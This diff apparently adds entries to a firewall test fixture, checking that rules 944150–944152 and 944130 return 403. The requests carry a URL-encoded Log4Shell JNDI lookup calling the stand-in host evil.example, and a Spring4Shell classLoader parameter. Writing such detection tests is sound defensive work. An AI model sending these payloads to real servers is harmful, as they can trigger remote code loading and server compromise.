@@ -1,0 +1,4 @@
+944150	path	403	/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+944151	path	403	/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+944152	path	403	/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+944130	path	403	/?x=class.module.classLoader
